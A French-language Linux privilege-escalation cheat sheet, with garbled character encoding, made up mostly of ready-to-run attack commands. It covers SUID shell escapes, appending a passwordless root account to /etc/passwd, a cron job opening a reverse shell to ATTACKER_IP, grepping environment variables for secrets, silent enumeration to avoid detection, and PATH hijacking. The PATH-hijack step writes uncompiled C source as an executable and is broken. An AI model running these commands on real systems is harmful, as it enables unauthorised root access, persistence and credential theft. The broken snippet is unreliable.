---
title: Privilege Escalation
date: "2025-07-20"
draft: false
---

# ðŸ”¥ Privilege Escalation - Cheat Sheet

## ðŸŽ¯ Vue d'ensemble
L'escalade de privilÃ¨ges permet d'obtenir des droits plus Ã©levÃ©s sur un systÃ¨me. Deux types principaux :
- **Verticale** : Utilisateur â†’ Root/Admin
- **Horizontale** : Utilisateur A â†’ Utilisateur B

---

## ðŸ” Ã‰numÃ©ration Initiale

### Informations SystÃ¨me
```bash
# Informations de base
# Pourquoi : Comprendre l'environnement et identifier les vecteurs d'attaque
whoami && id
hostname && uname -a
cat /etc/os-release
ps aux | grep root

# Variables d'environnement
# Pourquoi : Les variables d'env peuvent contenir des credentials ou des chemins sensibles
env | grep -i pass
env | grep -i key
env | grep -i secret
```

### Droits Sudo
```bash
# VÃ©rifier les commandes sudo autorisÃ©es
# Pourquoi : Identifier les commandes qui peuvent Ãªtre exÃ©cutÃ©es avec des privilÃ¨ges Ã©levÃ©s
sudo -l
sudo -l -U username

# Exploiter sudo sans mot de passe
# Pourquoi : Si sudo ne demande pas de mot de passe, on peut obtenir un shell root
sudo -u root /bin/bash
sudo -u root /bin/sh
```

### Binaires SUID/SGID
```bash
# Trouver les binaires SUID
# Pourquoi : Les binaires SUID s'exÃ©cutent avec les privilÃ¨ges du propriÃ©taire
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Trouver les binaires SGID
# Pourquoi : Les binaires SGID s'exÃ©cutent avec les privilÃ¨ges du groupe
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Binaires SUID populaires Ã  exploiter
# Pourquoi : Ces binaires sont souvent mal configurÃ©s et permettent l'escalade
find / -name "nmap" -perm -4000 2>/dev/null
find / -name "vim" -perm -4000 2>/dev/null
find / -name "python*" -perm -4000 2>/dev/null
find / -name "bash" -perm -4000 2>/dev/null
```

---

## ðŸ› ï¸ Exploitation des Binaires SUID

### Python
```bash
# Python SUID
# Pourquoi : Python peut exÃ©cuter des commandes systÃ¨me avec les privilÃ¨ges du propriÃ©taire
python -c 'import os; os.system("/bin/bash")'
python3 -c 'import os; os.system("/bin/bash")'

# Python avec pty
# Pourquoi : CrÃ©er un terminal interactif pour un shell plus stable
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Vim/VI
```bash
# Vim SUID
# Pourquoi : Vim peut exÃ©cuter des commandes systÃ¨me via ses fonctions intÃ©grÃ©es
vim -c ':!/bin/bash'
vim -c ':set shell=/bin/bash:shell'
```

### Nmap
```bash
# Nmap SUID (version interactive)
# Pourquoi : Nmap peut exÃ©cuter des commandes systÃ¨me en mode interactif
nmap --interactive
nmap> !bash
nmap> !sh
```

### Find
```bash
# Find SUID
# Pourquoi : Find peut exÃ©cuter des commandes via l'option -exec
find /etc/passwd -exec /bin/bash \;
find /etc/passwd -exec /bin/sh \;
```

### Less/More
```bash
# Less SUID
# Pourquoi : Less peut exÃ©cuter des commandes via l'opÃ©rateur !
less /etc/passwd
!/bin/bash

# More SUID
# Pourquoi : More peut Ã©galement exÃ©cuter des commandes systÃ¨me
more /etc/passwd
!/bin/bash
```

---

## ðŸ“ Exploitation des Permissions

### Fichiers Ã‰criturables
```bash
# Fichiers de configuration critiques
# Pourquoi : Ces fichiers contrÃ´lent l'authentification et les privilÃ¨ges
ls -la /etc/passwd
ls -la /etc/shadow
ls -la /etc/sudoers

# Ajouter un utilisateur root
# Pourquoi : CrÃ©er un compte avec des privilÃ¨ges root complets
echo "hacker::0:0::/root:/bin/bash" >> /etc/passwd
```

### Cron Jobs
```bash
# Lister les cron jobs
# Pourquoi : Les cron jobs s'exÃ©cutent avec des privilÃ¨ges spÃ©cifiques
crontab -l
cat /etc/crontab
ls -la /var/spool/cron/
ls -la /etc/cron.d/

# CrÃ©er un cron job malveillant
# Pourquoi : Les cron jobs peuvent exÃ©cuter des commandes avec des privilÃ¨ges Ã©levÃ©s
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" | crontab -
```

### Services
```bash
# Services avec privilÃ¨ges Ã©levÃ©s
# Pourquoi : Identifier les services qui s'exÃ©cutent avec des privilÃ¨ges root
systemctl list-units --type=service --state=running
ps aux | grep root

# Modifier un service
# Pourquoi : Les services peuvent Ãªtre modifiÃ©s pour exÃ©cuter du code malveillant
systemctl edit --full service_name
```

---

## ðŸ”§ Outils AutomatisÃ©s

### LinPEAS
```bash
# TÃ©lÃ©charger et exÃ©cuter
# Pourquoi : LinPEAS automatise la dÃ©couverte des vecteurs d'escalade
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# ExÃ©cution silencieuse
# Pourquoi : Ã‰viter la dÃ©tection en exÃ©cutant silencieusement
./linpeas.sh -s | tee linpeas_output.txt
```

### LinEnum
```bash
# TÃ©lÃ©charger et exÃ©cuter
# Pourquoi : LinEnum est un script d'Ã©numÃ©ration Linux complet
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

### Linux Exploit Suggester
```bash
# VÃ©rifier les exploits disponibles
# Pourquoi : Identifier les exploits kernel disponibles pour la version dÃ©tectÃ©e
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

---

## ðŸŽ¯ Techniques AvancÃ©es

### Kernel Exploits
```bash
# VÃ©rifier la version du kernel
# Pourquoi : Les exploits kernel sont spÃ©cifiques Ã  la version
uname -r
cat /proc/version

# Exploits populaires
# Pourquoi : Ces exploits sont bien documentÃ©s et souvent efficaces
# Dirty COW (CVE-2016-5195)
# Sudo Baron Samedit (CVE-2021-3156)
# PwnKit (CVE-2021-4034)
```

### Conteneurs Docker
```bash
# VÃ©rifier si on est dans un conteneur
# Pourquoi : Les techniques d'Ã©vasion de conteneur sont diffÃ©rentes
cat /.dockerenv
mount | grep docker
env | grep -i docker

# Ã‰vasion de conteneur
# Pourquoi : Sortir du conteneur pour accÃ©der au systÃ¨me hÃ´te
# Montage du host filesystem
# Escape via capabilities
```

### Variables d'Environnement
```bash
# Variables sensibles
# Pourquoi : Les variables d'env peuvent contenir des credentials
env | grep -i pass
env | grep -i key
env | grep -i secret
env | grep -i token

# PATH hijacking
# Pourquoi : Remplacer les binaires systÃ¨me par des versions malveillantes
echo 'int main(){setuid(0);system("/bin/bash");}' > /tmp/sudo
chmod +x /tmp/sudo
export PATH="/tmp:$PATH"
```

---

## ðŸ“š Ressources

- **GTFOBins** : https://gtfobins.github.io/
- **HackTricks** : https://book.hacktricks.xyz/linux-hardening/privilege-escalation
- **PayloadsAllTheThings** : https://github.com/swisskyrepo/PayloadsAllTheThings
- **LinPEAS** : https://github.com/carlospolop/PEASS-ng

---

_DerniÃ¨re mise Ã  jour : 20 juillet 2025_ 